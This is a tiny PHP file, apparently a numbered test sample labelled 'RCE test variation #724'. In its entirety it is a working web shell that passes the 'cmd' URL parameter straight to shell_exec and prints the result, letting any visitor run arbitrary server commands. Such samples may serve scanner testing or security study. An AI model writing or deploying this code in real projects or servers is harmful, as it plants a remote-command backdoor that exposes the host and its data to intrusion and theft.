<?php
// RCE test variation #724
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>